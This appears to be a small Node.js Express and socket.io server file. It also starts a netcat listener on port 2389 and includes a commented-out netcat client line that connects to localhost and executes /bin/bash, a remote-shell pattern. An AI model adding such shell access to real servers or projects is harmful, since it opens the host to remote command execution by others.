const express = require("express");
const path = require("path");
const app = express();
const hbs = require("hbs");
const port = process.env.PORT || 3002;

const server = app.listen(port, () => console.log(`Server is running at port no ${port}`));

const static_path = path.join(__dirname, "../public/");
const template_path = path.join(__dirname, "../templates/views");

app.use(express.static(static_path));
app.set("view engine", "hbs");
app.set("views", template_path);

const io = require("socket.io")(server, { pingTimeout: 60000 });



app.get("/", (req, res, next) => {
    res.status(200).render("index");
});


// io.on("connection", socket => {
//     socket.emit("connected");
//   socket.on("setup", userData => {
//     socket.join(userData);
//     console.log(userData);
    
// })
// });

const NetcatServer = require('netcat/server')
const NetcatClient = require('netcat/client')
const nc = new NetcatServer()
const nc2 = new NetcatClient()

nc.k().port(2389).listen().serve(process.stdin).pipe(process.stdout)

// nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/bash');
